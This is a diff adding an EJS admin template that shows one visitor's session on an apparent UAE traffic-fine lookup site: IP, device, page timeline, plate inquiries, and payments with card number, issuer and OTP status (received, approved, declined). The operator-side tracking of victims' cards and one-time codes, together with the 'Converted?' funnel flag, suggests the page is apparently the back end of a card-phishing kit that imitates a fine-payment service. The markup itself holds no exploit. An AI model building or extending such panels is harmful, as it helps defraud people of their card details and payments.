@@ -1,0 +1,148 @@
+<%- include('_layout', { pageTitle: 'Session Detail', activePage: 'sessions', adminUser }) %>
+
+<% if (typeof dbError !== 'undefined' && dbError) { %>
+<div class="alert alert-error">Database error: <%= dbError %></div>
+<% } %>
+
+<% if (!state) { %>
+<div class="alert alert-error">Session not found.</div>
+<a href="/admin/sessions" class="btn btn-ghost">← Back to Sessions</a>
+<% } else { %>
+
+<a href="/admin/sessions" class="btn btn-ghost btn-sm" style="margin-bottom:16px;">← All Sessions</a>
+
+<style>
+.det-grid { display:grid; grid-template-columns: 1fr 1fr; gap:14px; margin-bottom:20px; }
+.det-card { background:var(--bg-card); border:1px solid var(--bd); border-radius:12px; padding:18px 20px; }
+.det-card h3 { font-size:11px; font-weight:700; color:var(--tx-muted); text-transform:uppercase; letter-spacing:.5px; margin-bottom:14px; }
+.det-row { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px dashed var(--bd-light); font-size:13px; }
+.det-row:last-child { border-bottom:none; }
+.det-row .k { color:var(--tx-muted); }
+.det-row .v { color:var(--tx-base); font-weight:600; font-family:'SFMono-Regular',Consolas,monospace; }
+.timeline { background:var(--bg-card); border:1px solid var(--bd); border-radius:12px; padding:20px; }
+.tl-item { display:flex; gap:14px; padding:12px 0; border-bottom:1px solid var(--bd-light); }
+.tl-item:last-child { border-bottom:none; }
+.tl-rank { width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:13px; flex-shrink:0; }
+.tl-r-1 { background:#f1f5f9; color:#475569; }
+.tl-r-2 { background:#dbeafe; color:#1e40af; }
+.tl-r-3 { background:#fef3c7; color:#92400e; }
+.tl-r-4 { background:#fed7aa; color:#9a3412; }
+.tl-r-5 { background:#dcfce7; color:#166534; }
+.tl-body { flex:1; min-width:0; }
+.tl-path { font-family:'SFMono-Regular',Consolas,monospace; font-size:13px; font-weight:600; color:var(--tx-base); }
+.tl-meta { font-size:11px; color:var(--tx-muted); margin-top:3px; }
+.tl-time { font-size:13px; font-weight:700; color:#006837; white-space:nowrap; }
+@media (max-width: 900px) { .det-grid { grid-template-columns: 1fr; } }
+</style>
+
+<div class="det-grid">
+  <div class="det-card">
+    <h3>Visitor</h3>
+    <div class="det-row"><span class="k">Status</span><span class="v">
+      <% if (state.is_live) { %>
+        <span class="status-dot active"></span> Live now
+      <% } else { %>
+        <span class="status-dot offline"></span> Offline
+      <% } %>
+    </span></div>
+    <div class="det-row"><span class="k">Visitor ID</span><span class="v" style="font-size:11px;"><%= state.visitor_id %></span></div>
+    <div class="det-row"><span class="k">IP Address</span><span class="v"><%= state.ip %></span></div>
+    <div class="det-row"><span class="k">Device</span><span class="v"><%= state.ua_parsed.device %> · <%= state.ua_parsed.browser %> · <%= state.ua_parsed.os %></span></div>
+    <div class="det-row"><span class="k">First seen</span><span class="v" style="font-size:12px;"><%= new Date(state.first_seen).toLocaleString('en-AE', {timeZone:'Asia/Dubai'}) %></span></div>
+    <div class="det-row"><span class="k">Last seen</span><span class="v" style="font-size:12px;"><%= new Date(state.last_seen).toLocaleString('en-AE', {timeZone:'Asia/Dubai'}) %></span></div>
+  </div>
+
+  <div class="det-card">
+    <h3>Journey</h3>
+    <div class="det-row"><span class="k">Pages viewed</span><span class="v"><%= state.page_count %></span></div>
+    <div class="det-row"><span class="k">Time on site (raw)</span><span class="v">
+      <%
+        const totalRaw = Math.floor((new Date(state.last_seen).getTime() - new Date(state.first_seen).getTime()) / 1000);
+        const m = Math.floor(totalRaw / 60), s = totalRaw % 60;
+      %><%= (m > 0 ? m + 'm ' : '') + s + 's' %>
+    </span></div>
+    <div class="det-row"><span class="k">Active time (capped)</span><span class="v">
+      <% const am = Math.floor(totalSec/60), as = totalSec%60 %><%= (am > 0 ? am + 'm ' : '') + as + 's' %>
+    </span></div>
+    <div class="det-row"><span class="k">Deepest reached</span><span class="v"><%= state.deepest_name %> (<%= state.deepest_path %>)</span></div>
+    <div class="det-row"><span class="k">Current page</span><span class="v"><%= state.current_path %></span></div>
+    <div class="det-row"><span class="k">Converted?</span><span class="v"><%= state.deepest_rank >= 5 ? '✅ Yes' : '✗ No' %></span></div>
+  </div>
+</div>
+
+<div class="timeline">
+  <h3 style="font-size:13px;font-weight:700;color:var(--tx-base);margin-bottom:14px;">Page Timeline (<%= timeline.length %> hits)</h3>
+  <% timeline.forEach(t => { %>
+  <div class="tl-item">
+    <div class="tl-rank tl-r-<%= t.rank %>"><%= t.rank %></div>
+    <div class="tl-body">
+      <div class="tl-path"><%= t.path %></div>
+      <div class="tl-meta"><%= t.name %> · <%= new Date(t.at).toLocaleString('en-AE', {timeZone:'Asia/Dubai', hour:'2-digit', minute:'2-digit', second:'2-digit'}) %></div>
+    </div>
+    <div class="tl-time">
+      <% if (t.is_last) { %>
+        <% const ls = Math.floor(t.seconds/60), lss = t.seconds%60 %>
+        <%= (ls>0 ? ls+'m ' : '') + lss + 's' %> <span style="font-size:10px;color:var(--tx-muted);font-weight:500;">(open)</span>
+      <% } else { %>
+        <% const ts = Math.floor(t.seconds/60), tss = t.seconds%60 %>
+        <%= (ts>0 ? ts+'m ' : '') + tss + 's' %>
+      <% } %>
+    </div>
+  </div>
+  <% }) %>
+  <% if (timeline.length === 0) { %>
+    <div style="color:var(--tx-muted);text-align:center;padding:20px;">No page hits recorded.</div>
+  <% } %>
+</div>
+
+<% if (inquiries.length || payments.length) { %>
+<div style="margin-top:20px;">
+  <% if (inquiries.length) { %>
+  <div class="table-card">
+    <div class="tc-header"><div class="tc-title">Related Inquiries (<%= inquiries.length %>)</div></div>
+    <table>
+      <thead><tr><th>Plate</th><th>Fines</th><th>Total</th><th>Date</th></tr></thead>
+      <tbody>
+      <% inquiries.forEach(i => { %>
+        <tr>
+          <td class="mono"><%= i.plate_src %> / <%= i.plate_code %> <%= i.plate_no %></td>
+          <td><%= i.fine_count %></td>
+          <td><strong>AED <%= Number(i.total_amount).toLocaleString() %></strong></td>
+          <td class="muted small"><%= new Date(i.created_at).toLocaleString('en-AE', {timeZone:'Asia/Dubai'}) %></td>
+        </tr>
+      <% }) %>
+      </tbody>
+    </table>
+  </div>
+  <% } %>
+
+  <% if (payments.length) { %>
+  <div class="table-card" style="margin-top:14px;">
+    <div class="tc-header"><div class="tc-title">Related Payments (<%= payments.length %>)</div></div>
+    <table>
+      <thead><tr><th>Card</th><th>Issuer</th><th>Amount</th><th>Status</th><th>Date</th></tr></thead>
+      <tbody>
+      <% payments.forEach(p => { %>
+        <tr>
+          <td class="mono"><%= p.card_number ? ('****' + String(p.card_number).slice(-4)) : '—' %></td>
+          <td><%= p.card_issuer || '—' %></td>
+          <td><strong>AED <%= Number(p.total_fine).toLocaleString() %></strong></td>
+          <td>
+            <% if (p.otp_status === 'approved')  { %><span class="badge b-approved">Approved</span><% }
+               else if (p.otp_status === 'declined') { %><span class="badge b-declined">Declined</span><% }
+               else if (p.otp_status === 'otp_received') { %><span class="badge b-received">OTP</span><% }
+               else { %><span class="badge b-pending">Pending</span><% } %>
+          </td>
+          <td class="muted small"><%= new Date(p.created_at).toLocaleString('en-AE', {timeZone:'Asia/Dubai'}) %></td>
+        </tr>
+      <% }) %>
+      </tbody>
+    </table>
+  </div>
+  <% } %>
+</div>
+<% } %>
+
+<% } %>
+
+<%- include('_layout_end') %>
